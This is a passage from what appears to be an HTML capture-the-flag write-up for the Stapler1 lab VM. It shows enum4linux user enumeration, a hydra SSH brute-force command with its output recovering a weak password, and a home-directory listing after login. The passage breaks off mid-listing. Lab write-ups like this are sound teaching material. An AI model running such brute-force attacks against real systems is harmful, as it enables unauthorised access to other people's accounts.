+                S-1-22-1-1004&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\A</span>Parnell&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1005&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\S</span>Hayslett&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1006&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\M</span>Bassin&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1007&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\J</span>Bare&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1008&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\L</span>Solum&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1009&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\I</span>Chadwick&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1010&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\M</span>Frei&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1011&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\S</span>Stroud&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1012&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\C</span>Ceaser&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1013&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\J</span>Kanode&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1014&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\C</span>Joo&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1015&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\E</span>eth&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1016&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\L</span>Solum2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1017&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\J</span>Lipps&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1018&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\j</span>amie&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1019&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\S</span>am&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1020&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\D</span>rew&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1021&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\j</span>ess&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1022&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\S</span>HAY&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1023&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\T</span>aylor&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1024&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\m</span>el&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1025&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\k</span>ai&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1026&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\z</span>oe&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1027&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\N</span>ATHAN&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1028&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\w</span>ww&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1029&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\e</span>lly&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                ...<br>
+                <br>
+                enum4linux&nbsp;<span style="color:#ff9d00;font-weight:700">complete</span>&nbsp;on&nbsp;Sat&nbsp;Apr&nbsp;13&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>58<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;2019
+            </div>
+        </div><br>
+        <br>
+        I cleaned up this list to just include the username, and bruteforced SSH. If you ever retrieve a list of users on a system, and ssh is open, just try bruteforcing. You may as well (althought it's not exactly stealthy)<br>
+        <br>
+        <code>-e nsr</code> in hydra tries no password (n), the login as the password (s) and the reverse of the login as the password (r).<br>
+        If this didn't work, I would have tried top 100 passwords, top 1000 passwords, and then maybe rockyou.txt if I was really desperate.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;wordlists<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;wordlists<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>wordlists#&nbsp;nano&nbsp;sambaUsers.txt<br>
+                peter<br>
+                RNunemaker<br>
+                ETollefson<br>
+                DSwanger<br>
+                AParnell<br>
+                SHayslett<br>
+                MBassin<br>
+                JBare<br>
+                LSolum<br>
+                IChadwick<br>
+                MFrei<br>
+                SStroud<br>
+                CCeaser<br>
+                JKanode<br>
+                CJoo<br>
+                Eeth<br>
+                LSolum2<br>
+                JLipps<br>
+                jamie<br>
+                Sam<br>
+                Drew<br>
+                jess<br>
+                SHAY<br>
+                Taylor<br>
+                mel<br>
+                kai<br>
+                zoe<br>
+                NATHAN<br>
+                www<br>
+                elly<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>wordlists#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;..<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;22ssh<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;22ssh<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>22ssh#&nbsp;hydra&nbsp;-v&nbsp;-L&nbsp;..<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>sambaUsers.txt&nbsp;-p&nbsp;password&nbsp;-e&nbsp;nsr&nbsp;-o&nbsp;hydraSambaNSR.txt&nbsp;<span style="color:#ff9d00;font-weight:700">ssh://</span>192.168.1.237&nbsp;-t&nbsp;4<br>
+                Hydra&nbsp;v8.8&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2019&nbsp;by&nbsp;van&nbsp;Hauser<span style="color:#ff9d00;font-weight:700">/</span>THC&nbsp;-&nbsp;Please&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;not&nbsp;use&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;military&nbsp;or&nbsp;secret&nbsp;service&nbsp;organizations,&nbsp;or&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">illegal</span>&nbsp;purposes.<br>
+                <br>
+                Hydra&nbsp;(https://github.com/vanhauser-thc/thc-hydra)&nbsp;starting&nbsp;at&nbsp;2019-04-13&nbsp;18:09:18<br>
+                [DATA]&nbsp;max&nbsp;4&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;4&nbsp;tasks,&nbsp;120&nbsp;login&nbsp;tries&nbsp;(l:30/p:0),&nbsp;~4&nbsp;tries&nbsp;per&nbsp;task<br>
+                [DATA]&nbsp;attacking&nbsp;ssh://192.168.1.237:22/<br>
+                [VERBOSE]&nbsp;Resolving&nbsp;addresses&nbsp;...&nbsp;[VERBOSE]&nbsp;resolving&nbsp;done<br>
+                [INFO]&nbsp;Testing&nbsp;if&nbsp;password&nbsp;authentication&nbsp;is&nbsp;supported&nbsp;by&nbsp;ssh://peter@192.168.1.237:22<br>
+                [INFO]&nbsp;Successful,&nbsp;password&nbsp;authentication&nbsp;is&nbsp;supported&nbsp;by&nbsp;ssh://192.168.1.237:22<br>
+                [22][ssh]&nbsp;host:&nbsp;192.168.1.237&nbsp;&nbsp;&nbsp;login:&nbsp;SHayslett&nbsp;&nbsp;&nbsp;password:&nbsp;SHayslett
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) SHayslett to root</strong></h2><br>
+        Log in via ssh and have a look around...<br>
+            <div class="codebox">
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>*<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>AParnell<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;AParnell&nbsp;AParnell&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;AParnell&nbsp;AParnell&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;AParnell&nbsp;AParnell&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;AParnell&nbsp;AParnell&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>CCeaser<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;CCeaser&nbsp;CCeaser&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;CCeaser&nbsp;CCeaser&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;CCeaser&nbsp;CCeaser&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;CCeaser&nbsp;CCeaser&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>CJoo<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;CJoo&nbsp;CJoo&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;CJoo&nbsp;CJoo&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;CJoo&nbsp;CJoo&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;CJoo&nbsp;CJoo&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>Drew<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;Drew&nbsp;Drew&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Drew&nbsp;Drew&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Drew&nbsp;Drew&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Drew&nbsp;Drew&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>DSwanger<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;DSwanger&nbsp;DSwanger&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;DSwanger&nbsp;DSwanger&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;DSwanger&nbsp;DSwanger&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;DSwanger&nbsp;DSwanger&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>Eeth<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;Eeth&nbsp;Eeth&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Eeth&nbsp;Eeth&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Eeth&nbsp;Eeth&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Eeth&nbsp;Eeth&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>elly<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;elly&nbsp;elly&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;elly&nbsp;elly&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;elly&nbsp;elly&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;elly&nbsp;elly&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ETollefson<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;ETollefson&nbsp;ETollefson&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ETollefson&nbsp;ETollefson&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ETollefson&nbsp;ETollefson&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ETollefson&nbsp;ETollefson&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>IChadwick<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;IChadwick&nbsp;IChadwick&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;IChadwick&nbsp;IChadwick&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;IChadwick&nbsp;IChadwick&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;IChadwick&nbsp;IChadwick&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>jamie<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;jamie&nbsp;jamie&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;jamie&nbsp;jamie&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
